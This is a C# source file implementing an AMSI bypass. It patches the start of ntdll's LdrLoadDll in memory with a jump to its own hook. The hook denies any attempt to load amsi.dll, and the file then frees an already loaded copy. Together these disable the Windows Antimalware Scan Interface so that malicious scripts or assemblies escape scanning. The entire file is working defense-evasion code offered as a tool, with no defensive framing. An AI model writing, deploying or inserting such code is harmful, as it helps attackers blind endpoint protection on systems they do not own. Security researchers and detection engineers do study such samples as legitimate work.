using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

public class LoadHook
{
    static byte[] jumpBytes = new byte[]
      {
           0x48 ,0xb8,                   //mov rax,0x000000
           0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00,0x00,
           0xFF, 0xE0,                    //jmp rax
           0xC3
      };

    static byte[] orginalBytes = new byte[jumpBytes.Length];

    static IntPtr hLdrLoadDll = IntPtr.Zero;

    public static void StartHooking() 
    {
        var hNtdll = LoadLibrary("ntdll.dll");

        hLdrLoadDll = GetProcAddress(hNtdll, "LdrLoadDll");

        Marshal.Copy(hLdrLoadDll, orginalBytes, 0, orginalBytes.Length);

        HookLdrLoadDll();
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        Console.WriteLine("[+] Amsi Dll At -> {0}", hAmsi);
        Thread.Sleep(10000);
        bool res = FreeLibrary(hAmsi);
        Console.WriteLine("[+] Amsi Unloaded -> {0}", res);
    }
    private static void HookLdrLoadDll()
    {
        //Get Method Info for LdrLoadDllHook
        var methodInfo = typeof(LoadHook)
            .GetMethod("LdrLoadDllHook", BindingFlags.Static | BindingFlags.NonPublic);

        //Get Function pointer
        var functionPointner = methodInfo.MethodHandle
            .GetFunctionPointer();

        //Address to bytes
        var addressBytes = BitConverter
            .GetBytes(functionPointner.ToInt64());

        //Change jmp address
        addressBytes.CopyTo(jumpBytes, 2);

        uint oldProtect = 0;

        //Change memory protection to be writable
        bool isChanged = VirtualProtect(hLdrLoadDll,jumpBytes.Length,ReadWrite,out  oldProtect);

        if (!isChanged)
        {
            Console
                .WriteLine("[-] Cannot change memory protection -> {0}", hLdrLoadDll);
            return;
        }
        //Write our jmp instructions
        Marshal.Copy(jumpBytes, 0, hLdrLoadDll, jumpBytes.Length);
        //Restore memory protection
        isChanged = VirtualProtect(hLdrLoadDll,jumpBytes.Length,oldProtect, out oldProtect);

        if (!isChanged)
        {
            Console
                .WriteLine("[-] Cannot Restore memory protection -> {0}", hLdrLoadDll);
            return;
        }
        Console.WriteLine("[+] Hook Is Set on LdrLoadDll");
    }
    private static void UnhookLdrLoadDll()
    {
        uint oldProtect = 0;

        //Change memory protection to be writable
        bool isChanged = VirtualProtect(hLdrLoadDll, orginalBytes.Length,ReadWrite, out oldProtect);

        if (!isChanged)
        {
            Console
                .WriteLine("[-] Cannot change memory protection -> {0}", hLdrLoadDll);
            return;
        }

        //write origranl bytes
        Marshal.Copy(orginalBytes, 0, hLdrLoadDll, orginalBytes.Length);

        //Restore memory protection
        isChanged = VirtualProtect(hLdrLoadDll, orginalBytes.Length
            , oldProtect, out oldProtect);

        if (!isChanged)
        {
            Console
                .WriteLine("[-] Cannot Restore memory protection -> {0}", hLdrLoadDll);
            return;
        }

    }
    private static uint LdrLoadDllHook(IntPtr SearchPath,
        IntPtr DllCharacteristics,
        ref UnicodeString DllName,
        out IntPtr BaseAddress
    )
    {
        // Console.WriteLine("[+] Entered LdrLoadDllHook");

        Console.WriteLine("[+] Dll being loaded is -> {0}", DllName.ToString());
        //If dll is being loaded is Amsi.dll just return access denied 
        if (DllName.ToString()
            .IndexOf("amsi.dll", StringComparison.OrdinalIgnoreCase) >= 0)
        {
            BaseAddress = IntPtr.Zero;
            return NtStatusAccessDenied;
        }
        //we need to load other dlls So we don't break functionality

        //First We Restore LdrLoadDll 
        UnhookLdrLoadDll();

        //Call Orignal LdrLoadDll
        var status = LdrLoadDll(SearchPath, DllCharacteristics, ref DllName, out BaseAddress);

        //Hook LdrLoadDll again
        HookLdrLoadDll();

        return status;
    }

    private const uint ReadWrite = 0x04;

    private static uint NtStatusAccessDenied = 0xC0000022;

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress,
int dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    private static extern uint LdrLoadDll(
        IntPtr SearchPath, IntPtr DllCharacteristics,
        ref UnicodeString DllName,
        out IntPtr BaseAddress);
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool FreeLibrary(IntPtr hModule);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct UnicodeString
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
        public UnicodeString(string s)
        {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)((s.Length + 1) * 2); // +1 for null terminator
            Buffer = Marshal.StringToHGlobalUni(s);
        }

        public override string ToString()
        {
            return Marshal.PtrToStringUni(Buffer, Length / 2);
        }
    }
}